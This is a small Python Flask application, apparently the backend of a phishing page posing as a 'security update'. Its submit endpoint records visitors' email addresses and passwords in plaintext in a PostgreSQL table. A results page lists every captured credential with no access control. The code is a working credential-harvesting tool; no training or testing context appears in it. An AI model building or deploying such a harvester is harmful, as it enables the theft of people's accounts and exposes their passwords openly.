import os
from datetime import datetime

import psycopg2
from flask import Flask, jsonify, render_template, request

app = Flask(__name__)


def get_db_connection():
    return psycopg2.connect(
        host=os.environ.get("DB_HOST", "db"),
        port=os.environ.get("DB_PORT", "5432"),
        dbname=os.environ.get("DB_NAME", "securityupdate"),
        user=os.environ.get("DB_USER", "securityupdate"),
        password=os.environ.get("DB_PASSWORD", "securityupdate"),
    )


@app.route("/")
def index():
    return render_template("index.html")


@app.post("/api/submit")
def submit():
    payload = request.get_json(silent=True) or {}
    email_value = (payload.get("email") or "").strip()
    password_value = (payload.get("password") or "").strip()

    if not email_value or not password_value:
        return jsonify({"ok": False, "message": "Email et mot de passe requis."}), 400

    created_at = datetime.utcnow()
    with get_db_connection() as conn:
        with conn.cursor() as cur:
            cur.execute(
                """
                INSERT INTO submissions (email_value, password_value, created_at)
                VALUES (%s, %s, %s)
                """,
                (email_value, password_value, created_at),
            )
        conn.commit()

    return jsonify({"ok": True})


@app.get("/results")
def results():
    with get_db_connection() as conn:
        with conn.cursor() as cur:
            cur.execute(
                """
                SELECT email_value, password_value, created_at
                FROM submissions
                ORDER BY created_at DESC
                """
            )
            rows = cur.fetchall()

    return render_template("results.html", rows=rows)


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
